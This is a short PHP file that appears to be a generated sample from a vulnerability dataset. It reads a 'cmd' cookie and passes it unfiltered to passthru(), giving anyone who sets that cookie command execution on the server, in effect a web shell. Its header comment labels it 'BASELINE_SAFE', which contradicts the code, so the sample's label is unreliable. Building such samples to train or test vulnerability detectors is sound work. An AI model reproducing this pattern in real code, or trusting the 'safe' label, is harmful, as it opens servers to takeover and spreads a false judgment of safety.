<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_AKE; SKELETON=S1; KEY=cmd; SINK=B4; VAR=v0008 */
function SINK_B4($command){
    passthru($command);
}
$inp = array_key_exists("cmd", $_COOKIE) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B4($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
